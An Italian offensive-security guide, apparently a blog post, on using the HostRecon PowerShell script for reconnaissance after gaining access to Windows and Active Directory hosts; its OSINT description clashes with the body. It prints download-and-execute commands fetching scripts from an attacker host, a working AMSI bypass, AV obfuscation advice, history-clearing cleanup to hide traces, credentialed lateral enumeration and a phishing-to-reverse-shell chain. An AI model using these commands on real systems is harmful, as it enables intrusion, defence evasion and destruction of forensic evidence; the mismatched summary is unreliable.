---
title: 'HostRecon: Reconnaissance Automatica OSINT su Target Singoli'
slug: hostrecon
description: >-
  HostRecon automatizza OSINT e reconnaissance su singolo dominio: DNS, whois,
  subdomain, breach data e exposure mapping in un solo comando.
image: /Gemini_Generated_Image_sxz0r4sxz0r4sxz0.webp
draft: false
date: 2026-02-14T00:00:00.000Z
categories:
  - tools
subcategories:
  - enum
tags:
  - osint
---

HostRecon è uno script [PowerShell](https://hackita.it/articoli/powershell) per situational awareness su sistemi Windows, progettato per raccogliere rapidamente informazioni sull'host locale e il contesto Active Directory. A differenza di tool focalizzati su privilege escalation, HostRecon si concentra sulla comprensione dell'ambiente: chi sono, dove sono, cosa posso raggiungere. In questa guida impari a usare HostRecon per orientarti dopo aver ottenuto accesso iniziale.

### Posizione nella Kill Chain

HostRecon interviene immediatamente dopo l'initial access per situational awareness:

```
Initial Access → [HOSTRECON] → Environment Understanding → Targeted Enumeration → Exploitation
```

## 1️⃣ Setup e Installazione

### Download

```bash
# Clone repository
git clone https://github.com/dafthack/HostRecon.git

# Download diretto
wget https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1
```

### Trasferimento su Target

```powershell
# Download in memoria
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/HostRecon.ps1')

# Via certutil
certutil -urlcache -split -f http://192.168.1.50/HostRecon.ps1 C:\Windows\Temp\hr.ps1
```

### Verifica Funzionamento

```powershell
powershell -ep bypass
Import-Module .\HostRecon.ps1
Invoke-HostRecon
```

Output atteso:

```
====================================================
  HostRecon - Host Reconnaissance Script
  https://github.com/dafthack/HostRecon
====================================================

[*] Gathering System Information...
```

### Requisiti

* PowerShell 2.0+
* Funziona come user standard
* Windows 7+ / Server 2008+
* Active Directory environment (per alcune feature)

## 2️⃣ Uso Base

### Esecuzione Standard

```powershell
Import-Module .\HostRecon.ps1
Invoke-HostRecon
```

### Output su File

```powershell
Invoke-HostRecon | Out-File C:\Windows\Temp\hostrecon.txt
```

### Esecuzione in Memoria

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/HostRecon.ps1'); Invoke-HostRecon
```

### Sezioni dell'Output

| Sezione            | Contenuto                       |
| ------------------ | ------------------------------- |
| System Info        | OS, hostname, domain membership |
| Current User       | Username, groups, privileges    |
| Local Users/Groups | Account locali                  |
| Domain Info        | DC, domain name, trust          |
| Network            | IP, DNS, routes                 |
| Software           | Software installato             |
| Shares             | Share di rete                   |
| Security           | AV, firewall status             |

## 3️⃣ Tecniche Operative

### System Information Gathering

```powershell
Invoke-HostRecon
```

Output:

```
====================================================
              SYSTEM INFORMATION
====================================================
[+] Hostname: WORKSTATION01
[+] Domain: CORP.LOCAL
[+] OS: Microsoft Windows 10 Enterprise
[+] OS Build: 10.0.19041
[+] Architecture: AMD64
[+] System Directory: C:\Windows\system32
[+] Boot Time: 01/15/2024 08:30:00
```

### Current User Context

Output:

```
====================================================
              CURRENT USER CONTEXT
====================================================
[+] Current User: CORP\john.doe
[+] User SID: S-1-5-21-123456789-...

[+] Group Memberships:
    - CORP\Domain Users
    - CORP\IT-Support
    - CORP\VPN-Users
    - BUILTIN\Remote Desktop Users

[+] Privileges:
    - SeChangeNotifyPrivilege
    - SeIncreaseWorkingSetPrivilege
```

### Domain Information

```
====================================================
              DOMAIN INFORMATION
====================================================
[+] Domain: CORP.LOCAL
[+] Domain Controller: DC01.CORP.LOCAL
[+] DC IP: 10.10.10.10
[+] Forest: CORP.LOCAL

[+] Domain Trusts:
    - PARTNER.LOCAL (Bidirectional)
```

### Network Reconnaissance

```
====================================================
              NETWORK INFORMATION
====================================================
[+] IP Addresses:
    - 192.168.1.100 (Ethernet0)
    - 10.10.10.50 (VPN)

[+] DNS Servers:
    - 10.10.10.10
    - 10.10.10.11

[+] Network Shares Discovered:
    - \\DC01\SYSVOL
    - \\DC01\NETLOGON
    - \\FILESERVER\shared$
```

## 4️⃣ Tecniche Avanzate

### Correlazione con BloodHound

Usa info HostRecon per targeted BloodHound collection:

```powershell
# HostRecon identifica domain e DC
# Usa info per BloodHound
Invoke-BloodHound -CollectionMethod All -Domain CORP.LOCAL -DomainController DC01.CORP.LOCAL
```

### Integration con CrackMapExec

```powershell
# HostRecon trova subnet e trust
# Usa per targeted enumeration
proxychains crackmapexec smb 10.10.10.0/24 -u john.doe -p "password"
```

### Active Directory Mapping

```powershell
# Dopo HostRecon, approfondisci con PowerView
Import-Module PowerView.ps1
Get-DomainController
Get-DomainTrust
Get-DomainComputer -Properties name,operatingsystem
```

## 5️⃣ Scenari Pratici di Pentest

### Scenario 1: Initial Situational Awareness

**Timeline: 5 minuti**

Hai appena ottenuto shell, devi capire dove sei.

```powershell
# COMANDO
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/HostRecon.ps1'); Invoke-HostRecon
```

## OUTPUT ATTESO

```
====================================================
              SYSTEM INFORMATION
====================================================
[+] Hostname: WS-FINANCE01
[+] Domain: CORP.LOCAL
[+] Current User: CORP\finance.user

====================================================
              DOMAIN INFORMATION
====================================================
[+] Domain Controller: DC01.CORP.LOCAL (10.10.10.10)

====================================================
              NETWORK INFORMATION
====================================================
[+] Internal Networks:
    - 192.168.1.0/24 (Workstations)
    - 10.10.10.0/24 (Servers)
```

### COSA FARE SE FALLISCE

* **Execution Policy**: Usa `-ep bypass` o esegui inline con IEX.
* **Module non caricato**: Verifica download completo dello script.
* **Domain info vuoto**: Host non in dominio o utente locale.

### Scenario 2: Identify High-Value Targets

**Timeline: 10 minuti**

```powershell
# COMANDO
Invoke-HostRecon | Select-String -Pattern "Domain Controller|Admin|Server"
```

## OUTPUT ATTESO

```
[+] Domain Controller: DC01.CORP.LOCAL
[+] Domain Controller: DC02.CORP.LOCAL
[+] Group Memberships:
    - CORP\IT-Admins (nested)
```

### COSA FARE SE FALLISCE

* **Poche info AD**: L'utente ha visibilità limitata. Usa altri tool per enum.

### Scenario 3: Pre-Lateral Movement Intel

**Timeline: 10 minuti**

Prima di muoverti lateralmente, raccogli intel.

```powershell
# COMANDO
Invoke-HostRecon
```

## OUTPUT ATTESO

```
====================================================
              NETWORK SHARES
====================================================
[+] Accessible Shares:
    \\FILESERVER\IT$ - Read/Write
    \\FILESERVER\backup$ - Read
    \\DC01\SYSVOL - Read

====================================================
              SOFTWARE INVENTORY
====================================================
[+] Installed Software:
    - Microsoft Office 365
    - Cisco AnyConnect
    - VMware Horizon Client
    - PuTTY
```

Info utili: share scrivibili per payload, VPN client per pivot, PuTTY per credenziali salvate.

## 6️⃣ Toolchain Integration

### Flusso Operativo

```
Initial Shell → HostRecon (awareness) → Seatbelt (security) → PowerView (AD) → BloodHound (path)
```

### Concatenazione Tool

```powershell
# Fase 1: HostRecon per overview
Invoke-HostRecon

# Fase 2: Seatbelt per security posture
Seatbelt.exe -group=user

# Fase 3: PowerView per AD deep dive
Get-DomainUser -AdminCount
Get-DomainGroup -AdminCount

# Fase 4: BloodHound per attack path
Invoke-BloodHound -CollectionMethod All
```

### Confronto: HostRecon vs Alternative

| Feature        | HostRecon | Seatbelt | WinPEAS  | PowerView |
| -------------- | --------- | -------- | -------- | --------- |
| Focus          | Awareness | Security | PrivEsc  | AD        |
| Domain Info    | ✓         | Parziale | Parziale | ✓✓        |
| Local Enum     | ✓         | ✓✓       | ✓✓       | Limitato  |
| PrivEsc Checks | ✗         | ✓        | ✓✓       | ✗         |
| Stealth        | Medio     | Alto     | Basso    | Medio     |

**Quando usare HostRecon**: Primo tool post-access per capire l'ambiente.

## 7️⃣ Attack Chain Completa

### Scenario: Initial Access to Domain Mapping

**Timeline totale: 30 minuti**

**Fase 1: Initial Access (5 min)**

```
Phishing → Macro → Reverse shell
```

**Fase 2: Situational Awareness (5 min)**

```powershell
# HostRecon per overview
IEX(New-Object Net.WebClient).DownloadString('http://attacker/HostRecon.ps1')
Invoke-HostRecon
```

Output: CORP.LOCAL domain, DC01 at 10.10.10.10, user in IT-Support group.

**Fase 3: Security Enumeration (10 min)**

```powershell
# Seatbelt per security posture
Seatbelt.exe -group=user

# Check AV/EDR
Invoke-HostRecon | Select-String "Antivirus|Defender|EDR"
```

**Fase 4: AD Enumeration (10 min)**

```powershell
# PowerView per dettagli AD
Import-Module PowerView.ps1
Get-DomainController
Get-DomainTrust
Get-DomainUser -AdminCount
Find-LocalAdminAccess
```

**Risultato**: Mappa completa dell'ambiente, pronto per targeted attack.

## 8️⃣ Detection & Evasion

### Cosa Monitora il Blue Team

| Indicator    | Event/Log         | Detection            |
| ------------ | ----------------- | -------------------- |
| PowerShell   | 4104              | Script block logging |
| AD Queries   | Directory Service | LDAP queries         |
| Share enum   | 5140/5145         | Network share access |
| Net commands | 4688              | Command execution    |

### Tecniche di Evasion

**1. AMSI Bypass**

```powershell
# Prima di caricare HostRecon
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**2. Obfuscation**

```powershell
# Invoke-Obfuscation su HostRecon.ps1
Invoke-Obfuscation -ScriptPath HostRecon.ps1 -Command "TOKEN\ALL\1"
```

**3. Esecuzione Frammentata**

Esegui singole parti dello script invece dell'intero modulo.

### Cleanup

```powershell
# Rimuovi script
Remove-Item C:\Windows\Temp\hr.ps1

# Clear history
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

## 9️⃣ Performance & Scaling

### Benchmark

| Operazione         | Tempo    |
| ------------------ | -------- |
| Full HostRecon     | \~15 sec |
| Con domain queries | \~30 sec |
| Network share enum | \~20 sec |

### Multi-Target

```powershell
$targets = @("WS01", "WS02", "WS03")
foreach ($t in $targets) {
    Invoke-Command -ComputerName $t -ScriptBlock {
        IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/HostRecon.ps1')
        Invoke-HostRecon
    } > "recon_$t.txt"
}
```

### Risorse

* **CPU**: \~5% durante esecuzione
* **RAM**: \~40MB PowerShell
* **Rete**: Query AD e share enum
* **Disco**: \~20KB script

## 🔟 Tabelle Tecniche

### Info Raccolte da HostRecon

| Categoria | Dettagli           | Uso Offensive        |
| --------- | ------------------ | -------------------- |
| System    | OS, hostname, arch | Target profiling     |
| User      | Name, groups, SID  | Privilege assessment |
| Domain    | DC, trusts, forest | Attack scope         |
| Network   | IPs, DNS, routes   | Lateral movement     |
| Shares    | Accessible shares  | Data access          |
| Software  | Installed apps     | Attack vectors       |
| Security  | AV, firewall       | Evasion planning     |

### Confronto Awareness Tools

| Feature     | HostRecon | Seatbelt | WinPEAS  | PowerView |
| ----------- | --------- | -------- | -------- | --------- |
| System Info | ✓         | ✓        | ✓        | ✗         |
| Domain Info | ✓         | Parziale | Parziale | ✓✓        |
| Trust Enum  | ✓         | ✗        | ✗        | ✓✓        |
| Network     | ✓         | ✓        | ✓        | ✗         |
| Share Enum  | ✓         | ✓        | ✓        | ✗         |
| AD Users    | Limitato  | ✗        | ✗        | ✓✓        |

## 1️⃣1️⃣ Troubleshooting

### Errore: "Execution Policy"

```powershell
# Fix
powershell -ep bypass
Import-Module .\HostRecon.ps1
```

### Domain Info Vuoto

**Host non è in dominio o utente è locale.**

```powershell
# Verifica
(Get-WmiObject Win32_ComputerSystem).PartOfDomain
```

### Share Enumeration Fallisce

**Permessi insufficienti o firewall.**

Fix: Alcune share richiedono privilegi. Enum solo ciò che è accessibile.

### Script Bloccato

**AV detection.**

Fix: AMSI bypass o offusca lo script prima dell'upload.

## 1️⃣2️⃣ FAQ

**HostRecon vs Seatbelt?**

HostRecon per situational awareness generale. [Seatbelt](https://hackita.it/articoli/seatbelt) per security-focused enumeration.

**Funziona su host non in dominio?**

Sì, ma le sezioni AD saranno vuote. Le info locali sono comunque raccolte.

**Posso personalizzare i check?**

Sì, è PowerShell. Modifica le funzioni secondo necessità.

**È rilevato dagli AV?**

Alcuni AV possono flaggare. Usa AMSI bypass o versione offuscata.

**HostRecon enum altri host?**

No, solo l'host locale. Per remote enum usa [PowerView](https://hackita.it/articoli/powerview) o [CrackMapExec](https://hackita.it/articoli/crackmapexec).

**Quanto è rumoroso?**

Medio. Genera query AD e share enum che possono essere loggati.

## 1️⃣3️⃣ Cheat Sheet

| Operazione    | Comando                                      |
| ------------- | -------------------------------------------- |
| Import module | `Import-Module .\HostRecon.ps1`              |
| Esecuzione    | `Invoke-HostRecon`                           |
| In-memory     | `IEX(...); Invoke-HostRecon`                 |
| Output file   | `Invoke-HostRecon \| Out-File out.txt`       |
| Filtra output | `Invoke-HostRecon \| Select-String "Domain"` |
| Bypass policy | `powershell -ep bypass`                      |

***

*Uso consentito solo in ambienti autorizzati. Per penetration test professionali: [hackita.it/servizi](https://hackita.it/servizi). Supporta HackIta: [hackita.it/supporto](https://hackita.it/supporto).*

**Repository**: [dafthack/HostRecon](https://github.com/dafthack/HostRecon)
